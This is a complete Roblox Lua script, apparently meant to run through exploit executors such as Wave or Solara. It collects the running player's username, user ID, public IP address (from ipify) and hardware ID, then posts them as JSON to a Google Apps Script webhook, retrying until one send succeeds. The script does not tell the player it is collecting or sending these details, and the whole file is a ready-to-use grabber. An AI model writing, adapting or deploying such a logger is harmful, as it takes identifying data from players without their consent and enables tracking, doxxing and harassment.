local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer
local url = "https://script.google.com/macros/s/AKfycbwrfscsrgGR-4nu-2U-96SR1wAneH9lSpoLGcyyJyVCHa4sRjO49V2xNVWysG5P9Lzh/exec" -- Paste your URL here

-- Start the loop
while true do
    -- Get IP using an external API
    local ipResponse = request({Url = "https://api.ipify.org/", Method = "GET"})
    local userIP = ipResponse.Body or "Unknown"

    -- Get HWID (UNC standard supported by Wave, Solara, etc.)
    local userHWID = gethwid and gethwid() or "Not Supported"

    local data = {
        ["name"] = player.Name,
        ["id"] = player.UserId,
        ["hwid"] = userHWID,
        ["ip"] = userIP
    }

    -- Send to Google Sheets via Webhook
    local success, err = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)

    if success then
        print("Successfully logged data. Stopping loop.")
        break -- <--- This stops the loop permanently after one successful log
    else
        warn("Failed to send data, retrying in 5 seconds: " .. tostring(err))
    end

    -- Wait 5 seconds before retrying ONLY if the first attempt failed
    task.wait(5)
end
